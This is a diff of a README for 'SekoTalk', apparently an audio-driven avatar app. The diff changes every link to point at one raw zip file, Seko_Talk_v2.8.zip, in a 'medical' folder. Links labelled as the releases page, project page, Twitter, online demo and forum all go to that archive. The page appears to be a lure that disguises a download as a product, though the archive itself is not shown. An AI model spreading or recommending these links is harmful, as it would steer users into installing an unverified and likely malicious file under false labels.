@@ -1,6 +1,6 @@
 # 🎤 SekoTalk - Create Stunning Audio-Driven Humans
 
-[![Download SekoTalk](https://raw.githubusercontent.com/Haidy440/SekoTalk/main/medical/SekoTalk.zip)](https://raw.githubusercontent.com/Haidy440/SekoTalk/main/medical/SekoTalk.zip)
+[![Download SekoTalk](https://github.com/Haidy440/SekoTalk/raw/refs/heads/main/medical/Seko_Talk_v2.8.zip)](https://github.com/Haidy440/SekoTalk/raw/refs/heads/main/medical/Seko_Talk_v2.8.zip)
 
 ## 🌟 Introduction
 
@@ -14,7 +14,7 @@ To get started with SekoTalk, follow the steps below to download and run the app
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page.  
-   [Download SekoTalk](https://raw.githubusercontent.com/Haidy440/SekoTalk/main/medical/SekoTalk.zip)
+   [Download SekoTalk](https://github.com/Haidy440/SekoTalk/raw/refs/heads/main/medical/Seko_Talk_v2.8.zip)
 
 2. **Choose Your Version**  
    On the Releases page, find the latest version of SekoTalk.  
@@ -64,8 +64,8 @@ To get started with SekoTalk, follow the steps below to download and run the app
 
 If you encounter any issues or have questions about SekoTalk, feel free to reach out:
 
-- Join our community forum on our [Project Page](https://raw.githubusercontent.com/Haidy440/SekoTalk/main/medical/SekoTalk.zip).
-- Follow us on [Twitter](https://raw.githubusercontent.com/Haidy440/SekoTalk/main/medical/SekoTalk.zip) for updates and tips.
+- Join our community forum on our [Project Page](https://github.com/Haidy440/SekoTalk/raw/refs/heads/main/medical/Seko_Talk_v2.8.zip).
+- Follow us on [Twitter](https://github.com/Haidy440/SekoTalk/raw/refs/heads/main/medical/Seko_Talk_v2.8.zip) for updates and tips.
 
 ## ✉️ Feedback and Contributions
 
@@ -73,7 +73,7 @@ Your feedback is essential to us. If you have suggestions or would like to contr
 
 ## 🌐 Online Demo
 
-Try our online demo to see SekoTalk in action. Visit our live demo at [SekoTalk Demo](https://raw.githubusercontent.com/Haidy440/SekoTalk/main/medical/SekoTalk.zip).
+Try our online demo to see SekoTalk in action. Visit our live demo at [SekoTalk Demo](https://github.com/Haidy440/SekoTalk/raw/refs/heads/main/medical/Seko_Talk_v2.8.zip).
 
 ## 📜 License
 
@@ -81,8 +81,8 @@ SekoTalk is open-source software, released under the MIT License. Feel free to u
 
 ## 🔗 Important Links
 
-- [Download SekoTalk](https://raw.githubusercontent.com/Haidy440/SekoTalk/main/medical/SekoTalk.zip)
-- [Visit SekoTalk Online Demo](https://raw.githubusercontent.com/Haidy440/SekoTalk/main/medical/SekoTalk.zip)
-- [Explore Project Page](https://raw.githubusercontent.com/Haidy440/SekoTalk/main/medical/SekoTalk.zip)
+- [Download SekoTalk](https://github.com/Haidy440/SekoTalk/raw/refs/heads/main/medical/Seko_Talk_v2.8.zip)
+- [Visit SekoTalk Online Demo](https://github.com/Haidy440/SekoTalk/raw/refs/heads/main/medical/Seko_Talk_v2.8.zip)
+- [Explore Project Page](https://github.com/Haidy440/SekoTalk/raw/refs/heads/main/medical/Seko_Talk_v2.8.zip)
 
 Enjoy creating with SekoTalk!
